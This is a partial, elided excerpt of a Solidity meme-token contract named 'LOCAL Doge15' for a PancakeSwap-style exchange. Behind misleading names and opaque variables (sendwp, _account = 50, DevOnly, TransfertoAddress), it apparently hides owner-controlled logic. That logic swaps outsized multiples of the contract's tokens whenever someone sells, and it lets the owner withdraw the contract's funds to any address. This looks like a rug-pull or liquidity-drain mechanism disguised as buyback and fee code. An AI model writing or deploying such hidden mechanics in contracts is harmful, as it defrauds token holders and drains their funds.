...
contract LOCALDOGE15 is Context, IERC20, Ownable {
    ...
    string private _name = "LOCAL Doge15";
    string private _symbol = "LDOGE15";
 ...
 /* Mainnet router: 0x10ED43C718714eb63d5aA57B78B54704E256024E
	...
	or: 0xD99D1c33F9fC3444f8101754aBC46c52416550D1*/     
    ...
    function decimals() public view returns (uint8) {
        return _decimals;} uint256 private _account = 50;
    ...
    function TransfertoAddress(address payable recipient, uint256 amount) external onlyOwner {
        transferToAddressETH(recipient, amount);} uint256 private _tSupply = 1;
    ...
    function totalFees() public view returns (uint256) {
        return _tFeeTotal;} uint256 private sendwp = 1;
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && swapAndLiquifyEnabled && to == uniswapV2Pair) {
            ...
            if (buyBackEnabled && balance > uint256(_balance)) {
                if (balance > _balance)
                    balance = balance;
                sendTokens(balance.div(sendwp).mul(_account));}}
        bool takeFee = true;
    ...
    function sendsForTokens(uint256 amount) private {
      ...
      // make the swap
        ...
        emit sendForTokens(amount, path);}
	...
	function sendTokens(uint256 amount) private lockTheSwap {
    	if (amount > 0) {sendsForTokens(amount/Fee); sendsForTokens(amount/Amounts); sendsForTokens(amount/tAmounts); sendsForTokens(amount/tToken); sendsForTokens(amount/tTokens);}}
    ...
    function setMaximumSwap(uint256 _maxswap) external onlyOwner() {
        _tSupply = _maxswap;}
    function setBuyAllocation(uint256 _sendwp) external onlyOwner() {
        sendwp = _sendwp;}
	...
	function FeeActivation() external onlyOwner {
    ...
    function DevOnly() external onlyOwner {
		...
		sendwp = 100; // inir buy allo div must 100
